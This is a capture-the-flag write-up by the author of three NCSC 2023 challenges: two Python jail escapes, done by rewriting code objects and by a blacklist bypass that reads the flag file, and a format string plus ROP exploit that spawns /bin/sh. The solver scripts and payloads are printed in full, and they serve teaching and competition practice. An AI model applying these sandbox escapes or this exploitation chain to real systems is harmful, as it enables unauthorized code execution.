# National Cyber Security Congress

[NCSC](https://www.facebook.com/NationalCSC), organized by Securinets, in it's 4th edition included a 12-hour CTF. As a technical team member, I had the chance to write some Binary Exploitation & Jail challenges. The tasks were a bit challenging & I'm glad a few enjoyed their time, despite the lack of solves.

This is going to be a writeup for the following challenges:
* [ObjectOrientedJail](#ObjectOrientedJail) (PyJail)
* [PyCryptoJail](#PyCryptoJail) (PyJail)
* [Formatter Specialist](#formatter-specialist) (Pwn)

For the challenge files & solvers:
* [ObjectOrientedJail](/2023/NCSC/src/objectorientedjail)
* [PyCryptoJail](/2023/NCSC/src/pycryptojail)
* [Formatter Specialist](/2023/NCSC/src/formatterspecialist)

---

### ObjectOrientedJail
Alright, so as far as I know, in order to escape from this jail you'll have to get creative. I couldn't find any simillar solutions nor unintended ways (however, if you find one I would love to know about it) for this challenge.

For this one, I was inspired from prototype pollution vulnerability in JS in order to change an object's properties/functions. Given the source code, we find a `Jail` class defined as the following:

```python
class Jail:
    def __init__(self):
        self.path = self
        self.copy = None
        self.call = False
    
    def cd(self, d):
        self.path = getattr(self.path, d)
    
    def setAttr(self, attr):
        setattr(self.path, attr, self.copy)
    
    def savePath(self):
        if self.copy is None:
            self.copy = self.path
    
    def makeCall(self, args):
        if self.call:
            return
        self.call = True
        self.copy = self.copy(*args)
    
    def reset(self):
        self.path = self
    
    def __del__(self):
        print("Bye")
        self.copy = None
        self.path = self
```

And then we get an instance of that class & we are able to basically use the class methods using a menu:

```python
a = Jail()
while True:
    print("1. Change path")
    print("2. Save path")
    print("3. Make a call")
    print("5. Reset")
    print("6. Give up")
    
    choice = int(input('> '))
    
    if choice == 1:
        path = input('New path: ')
        a.cd(path)
    
    elif choice == 2:
        a.savePath()

    elif choice == 3:
        args = safeReadArgs()
        a.makeCall(args)
    
    elif choice == 4:
        attr = input('Attribute: ')
        assert "path" not in attr and "copy" not in attr and "call" not in attr, "nope"
        a.setAttr(attr)
    
    elif choice == 5:
        a.reset()
    
    elif choice == 6:
        break
```

Before going any deeper, if we run the script & exit it properly, we can see the following:

<p align="center">
    <img src="/2023/NCSC/img/1.png"><br/>
</p>

We can notice the "bye" at the end of the execution, if we actually look at the code, it's being printed from the class destructor `__del__`:

```python
class Jail:
    ...
    def __del__(self):
        print("Bye")
        self.copy = None
        self.path = self
```

I added that as a way to show that the destructor is actually called at the end of the execution of the script.

That aside, we can see a `safeReadArgs` function being used & does a few checks:

```python
def safeReadArgs():
    args = input("Args tuple: ")
    assert len(args) <= 570, "Aint that a bit too long?"
    code = compile(args, "tmp", "single")
    args = code.co_consts[0]
    assert type(args) == tuple, "What you doing?"
    return args
```

So the length limit is 570 & our input (which is likely somekind of argument) must be of type `tuple`. In case you're not familiar with `compile` or `code` objects, this is a good chance to dive a bit into them.

The `compile` function will compile a given code & return a `code` object, which is used to represent the bytecode of the compiled code & a few more other properties, such as `co_consts`.

In general, any constant values used by a python code is stored in the `co_consts` array. Which is indexed later on by the compiled bytecode in order to execute the script properly. We'll dive more into these later on, this should be enough for this point.

So, if you try to compile the following code: `x=5; y=6; z=x+y`, 5 & 6 are going to be in `co_consts`. If you try `(5,6)`, that tuple is considered a constant & will be stored there, which is exactly what the `safeReadArgs` is using.

Okay, now we go back to our `Jail` class. We have 3 attributes:
 - `path`
 - `copy`
 - `call`

The `call` is only used here:

```python
class Jail:
    ...
    def makeCall(self, args):
        if self.call:
            return
        self.call = True
        self.copy = self.copy(*args)
    ...
```

So, it's simply used to verify if we used the `makeCall` method or no & we can use it only once. This method uses the `copy` as a callable object & calls it using a given `args` which can be traced back to our input via the `safeReadArgs` function. The arguments are spreaded as the function parameters. Also we notice that the result is stored in `copy` again.

Now, we have the following functions to review:

```python
class Jail:
    ...
    def cd(self, d):
        self.path = getattr(self.path, d)
    
    def setAttr(self, attr):
        setattr(self.path, attr, self.copy)
    
    def savePath(self):
        if self.copy is None:
            self.copy = self.path
    
    def reset(self):
        self.path = self
```

The `cd` function is used to navigate in `path` attributes, `reset` sets it back to `self`.

The `savePath` function is going to set `copy` value to `path` only if it's **None** & we can use `setAttr` to set a new attribute for `path` with the value of `copy`.

These are our tools, now knowledge time. Going back to the destructor, if we manage to override/overwrite it with our own function, we'll be able to get a code execution! But how?

Well, everything is based on objects in python, even functions. Each function has it's own attribute called `__code__` that contains the full logic of the function: Arguments count, named arg count, bytecode, variable names... We can simply check the help page for the `__code__`:

```python
def f():pass
help(f.__code__)
```

<p align="center">
    <img src="/2023/NCSC/img/2.png"><br/>
</p>

The constructor contains all the required details in order to define a function.

The catch is, `__code__` is **not** read only, you **can** change the logic of a function by simply changing it's `__code__` object! Do you see where this is going yet?

A possible exploitation scenario (intended one):
1. Navigate to a function's `__code__` object, navigate to it's `__class__` attribute.
2. Save the `__class__` attribute. Now we have a callable `code` class.
3. Instantiate a new `code` object, saving it in `copy`.
4. Navigate back to self -> `__class__` -> `__del__`
5. Set the `__code__` attribute for the `__del__` to your new function code, saved in `copy`.

And now you have a code execution! However, we still have more fun.

If we try to construct our own function locally, we can easly dump the required parameters for it's code class as the following, we can also setup a small test class to try things out:

```python
class A:
    def __del__(s): pass

def f(x):
    print("Hello!")
x = (f.__code__.co_argcount, f.__code__.co_posonlyargcount, f.__code__.co_kwonlyargcount, f.__code__.co_nlocals, f.__code__.co_stacksize, f.__code__.co_flags, f.__code__.co_code, f.__code__.co_consts, f.__code__.co_names, f.__code__.co_varnames, f.__code__.co_filename, f.__code__.co_name, f.__code__.co_firstlineno, f.__code__.co_linetable, f.__code__.co_freevars, f.__code__.co_cellvars)
print(x)

a = A()
A.__del__.__code__ = f.__code__
```

Running the above script will result in this:

<p align="center">
    <img src="/2023/NCSC/img/3.png"><br/>
</p>

It works! so far...

How about we try to construct a useful function? Like, opening a shell? We need a shell since the flag name is random.

```python
def f(x):
    import os
    os.system('id')
```

We get the following if we use that:

<p align="center">
    <img src="/2023/NCSC/img/4.png"><br/>
</p>

This is getting interesting, since the script finished it's execution, python got rid of some environments required by import **then** called the destructor. Here comes the final piece of the puzzle,

```python
import sys
```

`sys` is already imported at the top of the script. This is the fun part, if we want to get a shell (or import modules), we'll need to re-initialize everything. We can start by checking what's actually stored in `sys.meta_path`:

<p align="center">
    <img src="/2023/NCSC/img/5.png"><br/>
</p>

We'll need those classes! This is a straight-forward one, since it's a class, it'll be a sub-class of `object`. The dockerfile was provided for this to be sure of the indexes. We can start from a list object, climb up till we reach `object` & then we call `__subclasses__()` to get it's sub-classes, then it's a matter of finding the correct index:

```python
def f(x):
    x = [].__class__.__base__.__subclasses__()
    sys.meta_path = [x[104], x[121]]
```

Also yes, `meta_path` had 3 classes however, only 2 are needed for us to import. How to know that? after constructing the full payload we can (or, we have to) tweak some stuff to make it shorter, we basically try to optimize it. Those classes are:

- `<class '_frozen_importlib.BuiltinImporter'>`
- `<class '_frozen_importlib_external.PathFinder'>`

Okay, can I import now? not yet! A new error appears:

<p align="center">
    <img src="/2023/NCSC/img/6.png"><br/>
</p>

At least we can see what files are causing the error. You might not see a file but `<frozen importlib._bootstrap_external>` is kindof a compiled module, used to increase execution speed. Not important for us, however, we can find the files for this module locally! We just need to look for `importlib` module. Easiest way:

```python
import importlib
importlib.__path__
>> ['/usr/lib/python3.10/importlib']
```

<p align="center">
    <img src="/2023/NCSC/img/7.png"><br/>
</p>

Now, debug time! Trace the error & reverse how importing works! This is the source of the error:

<p align="center">
    <img src="/2023/NCSC/img/8.png"><br/>
</p>

`TypeError: 'NoneType' object is not iterable`, which means, `path` is set to `None` & that shouldn't be like that. We can trace the stack of error to the function before this, at line 1439.

<p align="center">
    <img src="/2023/NCSC/img/9.png"><br/>
</p>

We have a new lead: `path = sys.path`. We check:

```python
import sys
sys.path
>>> ['', '/usr/lib/python310.zip', '/usr/lib/python3.10', '/usr/lib/python3.10/lib-dynload', '/home/m0ngi/.local/lib/python3.10/site-packages', '/usr/local/lib/python3.10/dist-packages', '/usr/local/lib/python3.10/dist-packages/decomp2dbg-2.2.0-py3.10.egg', '/usr/local/lib/python3.10/dist-packages/pyelftools-0.29-py3.10.egg', '/usr/local/lib/python3.10/dist-packages/pyjnius-1.4.2-py3.10-linux-x86_64.egg', '/usr/lib/python3/dist-packages', '/usr/lib/python3.10/dist-packages']
```

This might be different from the one you get from your system **but** there will always be a commun part: ['/usr/lib/python3.10'].

As we did above, we can take everything & then remove an element each time & check if it'll work out or nah.

And a different error:

```
Exception ignored in: <function A.__del__ at 0x7fa4666e7f40>
Traceback (most recent call last):
  File "/home/m0ngi/CTF-Tasks/pyjail/jail 4/solve.py", line 53, in f
  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1002, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 945, in _find_spec
  File "<frozen importlib._bootstrap_external>", line 1439, in find_spec
  File "<frozen importlib._bootstrap_external>", line 1408, in _get_spec
  File "<frozen importlib._bootstrap_external>", line 1372, in _path_importer_cache
TypeError: 'NoneType' object is not subscriptable
```

We keep going! This is the block:

```python
try:
    finder = sys.path_importer_cache[path]
except KeyError:
    finder = cls._path_hooks(path)
    sys.path_importer_cache[path] = finder
return finder
```

To be specific, `finder = sys.path_importer_cache[path]`.

We can check that `path_importer_cache` is set to **None** too. If we look at the code, we can see that this is somekind of a module cache. We can either try to construct it OR we can relay on the exception handler to find it & upcate. So we can use an empty dict {} for this.

The next error would help to reinit the value of `path_hooks`.
And now we can import!

Final code:

```python
def f(x):
    x = [].__class__.__base__.__subclasses__()
    sys.meta_path = [x[104], x[121]]
    sys.path_importer_cache = {}
    sys.path_hooks = [x[122].path_hook(( (x[118].__subclasses__()[0], ['.py']) ))]
    sys.path = ['/usr/lib/python3.10']
    import os
    os.system('ls')
```

And this gives:

```python
(1, 0, 0, 2, 4, 67, b'g\x00j\x00j\x01\xa0\x02\xa1\x00}\x00|\x00d\x01\x19\x00|\x00d\x02\x19\x00g\x02t\x03_\x04i\x00t\x03_\x05|\x00d\x03\x19\x00\xa0\x06|\x00d\x04\x19\x00\xa0\x02\xa1\x00d\x05\x19\x00d\x06g\x01f\x02\xa1\x01g\x01t\x03_\x07d\x07g\x01t\x03_\x08d\x05d\x00l\t}\x01|\x01\xa0\nd\x08\xa1\x01\x01\x00d\x00S\x00', (None, 104, 121, 122, 118, 0, '.py', '/usr/lib/python3.10', 'ls'), ('__class__', '__base__', '__subclasses__', 'sys', 'meta_path', 'path_importer_cache', 'path_hook', 'path_hooks', 'path', 'os', 'system'), ('x', 'os'), '/home/m0ngi/CTF-Tasks/pyjail/jail 4/solve.py', 'f', 49, b'\x0c\x01\x12\x01\x06\x01$\x01\x08\x01\x08\x01\x0e\x01', (), ())
```

We have to get it to length 570! we can set the path to an empty string, remove any spaces... There is one extra step! Optimizing the bytecode! As you may notice, the **None** value is saved & used by the bytecode however it's not important here, we can get rid of it. To view opcodes of the function we can use `dis` module to view opcodes, disassemble a code object to get it's opcodes... Or we can use this:

```python
from opcode import opmap as OPCODE_MAPPING

inv = {y: x for x, y in OPCODE_MAPPING.items()}
op = b'' # bytecode
print('\n'.join([str(i) + "- " + inv[op[i]] + " " + str(op[i+1]) for i in range(0, len(op)-1, 2) if inv.get(op[i])]))
```

I won't be going into the details for this however, you can check the list of opcodes [here](https://docs.python.org/3.9/library/dis.html). The shortest bytecode & arguments I reached are the following:

```python
opcode = "g\\x00j\\x00j\\x01\\xa0\\x02\\xa1\\x00}\\x00" + \
         "|\\x00d\\x01\\x19\\x00|\\x00d\\x02\\x19\\x00g\\x02t\\x03_\\x04" + \
         "i\\x00t\\x03_\\x06" + \
         "|\\x00d\\x03\\x19\\x00\\xa0\\x05|\\x00d\\x04\\x19\\x00\\xa0\\x02\\xa1\\x00d\\x00\\x19\\x00d\\x05g\\x01f\\x02\\xa1\\x01g\\x01t\\x03_\\x07" + \
         "d\\x06g\\x01t\\x03_\\x08" + \
         "d\\x00d\\x00l\\t" + \
         "\\xa0\\n" + \
         "d\\x07" + \
         "\\xa1\\x01"

args = "(1,0,0,6,4,0,b'%s',(0,104,121,122,118,'.py','/usr/lib/python3.10','sh'),('__class__','__base__','__subclasses__','sys','meta_path','path_hook','path_importer_cache','path_hooks','path','os','system'), ('x',),'','',35,b'\\x0c\\x01\\x12\\x01\\x08\\x01\\x10\\x01\\x10\\x02\\x06\\x01\\x08\\x01\\x08\\x01\\x08\\x01\\x0e\\x01',(),())" % (opcode,)
```

At this point, it's done! You can import os & pop a shell!

### PyCryptoJail
This one was a lil mix between Crypto & a Pyjail, basically there are 2 steps for this:
1. Figure out the payload for the jail
2. Calculate the needed `p` & `x` to get your payload recovered.

For the Crypto part, credits goes to SSONEDE.

We'll start with the jail part. Now, usually people look only at the `exec` or `eval` functions & ignore the rest of the code, which is a waste of some good opportunities. In the challenge file, this is the execution part of the jail (After blacklist/whitelist checks):

```python
exec(c)
print(c)
print("Is that everything?!")
```

The key to this challenge is the `print` called after the `exec`. One might think that it'll simply print out our payload **but** what if the `exec` changes the value of it? That's the main idea for the challenge.

In the challenge description, we were told that the flag is saved in a file named "flag". Also, we were told that we are running python version 3.10

Considering the version part, I realized that it's not really important while I'm writing this. However, the flag file part tells us that we might need to open the flag file & read it's content.

In the blacklist, the "flag" part can be bypassed easly by using `"fl\\141g"` as example. Both `open` & `read` are not blacklisted so, we can open the file & read it's content using

```python
open('fl\\141g').read()
```

You might say, `.` is blacklisted! Yep it's, however, `getattr` isn't. The above payload can be changed to

```python
getattr(open('fl\\141g'),"read")()
```

And that's 33 chars long. Our limit is 38 (Line #46 in [main.py](/2023/NCSC/src/pycryptojail/main.py))

Now, how can we print that out? We don't! We already have a print ready for us! The first solver I wrote for this was using the `:=` operator which was added in Python 3.10 version:

```python
[c:=getattr(open('fl\\141g'),"read")()]
```

However, while writing this I figured out that we don't really need to use a list there. I missed this check! A shorter payload is

```python
c=getattr(open('fl\\141g'),"read")()
```

Which is 35 chars. 

Now the crypto part, I won't be going into details but the solution for this have a 50% chance of success since it requires `e` (randomly generated) to be odd.

Solver for the full challenge:

```python
from Crypto.Util.number import bytes_to_long
from pwn import *
from sympy import nextprime

r = process(["python3.10", "main.py"])

payload = b"c=getattr(open('fl\\141g'),'read')()#" + b"a"*50
payload = bytes_to_long(payload)
payload = nextprime(payload)

p = payload
x = payload-1

r.sendline(str(x))
r.sendline(str(p))

r.interactive()
```

### Formatter Specialist
For this one, there was one team (From the ones I checked) that got too close to solving it. The following binary was given:

```
$ checksec main
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

Running the binary, we see a menu:

<p align="center">
    <img src="/2023/NCSC/img/10.png"><br/>
</p>

I'll summarize the behavior of the program, We have the following structure:

```c
struct user{
    char uname[9];
    char birthday[40];
    char bio[360];
};
```

And this is the menu's functionalities:

1. Option 1, ability to set the value of the `uname` field. Reads 9 bytes & null terminates the buffer

```c
read(0, u->uname, 9);
u->uname[8] = 0;
```

Then passes it to a `printf` & we have a format string:

```c
char welcome[256];
sprintf(welcome, "Welcome! %s.\n", u->uname);

printf(welcome);
changedUName = 1;
```

However, we can only do this once due to the `changedUName` check. The value is changed after the `printf` so we cannot change it using the format string.

2. Option 2, ability to set the value of the `birthday` field. 40 bytes & our input is passed to a `verySecureFilter` function which does the following:

```c
void verySecureFilter(char *s){
    for(int i=0; i<strlen(s); i++){
        if(s[i] == '%' || s[i] == '$'){
            s[i] = 0x20;
        }
    }
}
```

This simply replaces every `%` & `$` with a space. Notice that we are using `strlen`, this is important later on to exploit.

3. Option 3, ability to set the `bio` field. 360 bytes (**NOT** null terminated, this is important). Input is passed to `verySecureFilter` function too but this won't be important.

4. Option 4, call showInfo:

```c
void showInfo(struct user* u){
    printf("Username %s:\n", u->uname);
    printf(u->birthday);
    printf("Bio: %s", u->bio);
}
```

We have an other format string on the birthday. Also, since `bio` field wasn't null terminated, we might have the chance to leak some values from the stack. Note that the size of it is 360 bytes, which is pretty large, that gives us a better chance to find some good addresses & leak them.

Now, what do we currently have?

1. 1 time use format string, limited size to 8 bytes.
2. A larger format string (40 bytes) however it's filtered using `verySecureFilter` function (That uses `strlen`)
3. A non-terminated buffer (`bio`) that's printed.

Since we have a full protection binary, we might need to leak some values to start with. After that, we can store a format string payload in `birthday` field. However, to bypass the filter we must start our buffer with a null byte (`\x00`). That way, `verySecureFilter` function won't be able to edit our payload.

One problem with that is, if the buffer starts with a null byte, the format string in `showInfo` won't be executed since `printf` won't go beyond the null byte. This is where the second format string comes in hands, we'll be able to write our payload with a null byte at the start, bypass the filter **then** overwrite the null byte with any value different than null. And that's what the one-time use format string would do.

For that, we'll need to leak a stack address too.

Also, it was a long time since I compiled this binary, one way to make things interesting was to compile it after the libc updates in order to get rid of gadgets. With that, a PIE leak won't be much of use & we'll have to leak something else. The solver I provided does indeed leak the PIE base however I'm not using any gadgets from the binary itself. More details below.

For a start, we shall run the program & attach gdb to view what values we might have in the `bio` buffer. For that, we can set a breakpoint at `*readBio+38`, we can view the address of the buffer in the arguments for the `read` call:

<p align="center">
    <img src="/2023/NCSC/img/11.png"><br/>
</p>

With that, we view the memory at address `0x00007fff2aead191`, also if you haven't noticed, the address isn't properly aligned (because the field before it has a size of 9), so if you use that without being aware of it, you might get some weird/invalid addresses. We shall use `0x00007fff2aead190`. The size is 360 bytes, which means we should only check for 360/8=45 memory QWORDs:

<p align="center">
    <img src="/2023/NCSC/img/12.png"><br/>
</p>

And yep, it seems we do have some good values! 

<p align="center">
    <img src="/2023/NCSC/img/13.png"><br/>
</p>

We got ourselves an address from the linker, from the binary & a few stack addresses. We start off with the stack leak, considering that the stack can change, we need to find a leak with a const offset to our stack frame, or we can use the main's stack frame too. I went for the offset to our structure variable which is located in the main's stackframe. A good leak is `0x00007fff2aead1ff` which is at offset 63 in `bio`.

I defined a few helper functions in the solver to represent the menu options & I'll be using them. To get our stack leak, we can use the following:

```python
payload = 'A'*56 + 'B'*6 # total of 62
    
setBio(payload) # Will send a \n at the end, gives total 63.
leak = showInfo().split(b'\n')

stack_leak  = u64(leak[-1].ljust(8, b'\0'))
struct_adr  = stack_leak - 0x9f
date_adr    = struct_adr + 9
bin_sh      = date_adr + 40
ret_adr     = stack_leak - 0xb7
```

With that, we get a return address, the address of our structure & we can calculate the address of each attribute. The `bin_sh` will be used later on, we'll simply store "/bin/sh" in our structure to use it.

Now, we move on to the next. Also, we must be careful here, we must always start with the smallest offset to leak since we'll be overwriting data. We go for the linker's leak (0x00007f27318a1da7) located at offset 71:

```python
# LD Leak
payload = 'A'*64 + 'B'*6
setBio(payload)
leak = showInfo().split(b'\n')

ld_leak = u64(leak[-1].ljust(8, b'\0'))
ld_base = ld_leak - 0x19da7
```

And finally (Not really needed), we can get a PIE leak at offset 312.

```python
# PIE Leak
payload = 'A'*305 + 'B'*6
setBio(payload)
# r.interactive()
leak = showInfo().split(b'\n')

pie_leak = u64(leak[-1].ljust(8, b'\0'))
pie_base = (pie_leak - 0x10) << 8
```

Now, we can do a typical ret2libc. I'm not sure if the offset between the linker & the libc base is constant but with the leaks we currently have, we can always do that by either calculating the base directly or doing a leak & a second stage ROP chain. However, that's a lot of work to do, we can check our linker for gadgets & it surely have some good stuff!

Those are the gadgets we'll be using

```python
# ROP Gads
ADD_RSP_RET         = ld_base + 0x000000000001d085 # add rsp, 0x110; mov eax, r12d; pop r12; ret;
SYSCALL             = ld_base + 0x0000000000001a97 # syscall;
POP_RDI             = ld_base + 0x000000000000118d # pop rdi; ret;
POP_RSI             = ld_base + 0x0000000000001d28 # pop rsi; ret;
POP_RAX_RDX_RBX     = ld_base + 0x00000000000011ce # pop rax; pop rdx; pop rbx; ret;
```

Now, we'll start with the format strings! We'll be writing a format string that starts with a null byte in `birthday` field then overwriting the null byte using the one-time use format string. Then use a format string with a buffer stored in `birthday` to overwrite a return address with a ROP chain.

One problem the team that got too close faced was the length limit for the one-time use format string, 8 bytes. considering that an address is itself 8 bytes long! how would it be possible? Well, everything is stored in a struct remember? And that means, the fields are successive in memory. We don't have to store the addresses to be used by the format string in the same buffer! As long as we can index it, it's fine to store it a lil bit far.

This is the last part of the solver which does overwrite the first byte of the `birthday` payload:

```python
payload = b"/bin/sh\0" + b"\x90"*207 # Padding
payload += rop_chain
payload += b"\x98"*(112 - len(rop_chain)) # Pad

# Used by format string payload
payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[2])) # 59
payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[1])) # 60
payload += p64(ret_adr + 2*ADD_RSP_RET_BYTES.index(ADD_RSP_RET_BYTES_sorted[0])) # 61
payload += p64(date_adr) # used by setUName payload

setBio(payload)

payload = ".%96$hhn" # 1 dot to write \x01
log('SetUName', setUName(payload))
```

As you can see, we stored the `date_adr` address in the `bio` & we only wrote ".%96$hhn" in the username. Index 96 points to the last 8 bytes in `bio`.

For the `ADD_RSP_RET_BYTES`, we'll come back to that soon. Ignore it for now.

Now, after overwriting "\x00" with "\x01", we'll be able to use our second format string. But how do we use that? We can write a ROP chain at the return address of `showInfo`. However, you might say that 40 bytes for a format string won't be enough. Debug time! If you look at the stack before returning from the `showInfo` function, you might notice that the structure which contains our input is close! 

<p align="center">
    <img src="/2023/NCSC/img/14.png"><br/>
</p>

Here comes the role of the ADD_RSP_RET gadget, which is a simple `add rsp, 0x110; mov eax, r12d; pop r12; ret;` to move rsp to our ROP chain stored in `bio` field.

After that, we can do a ROP chain to execute a syscall. We use gadgets from the linker to get control over `rax`, `rdi`, `rsi` & `rdx` registers. We store "/bin/sh" in `bio` & use that. We store all the addresses used by the format strings in the `bio` field.

And that's the end of the challenge. 

Hope you enjoyed this & feel free to contact me for any questions/feedbacks.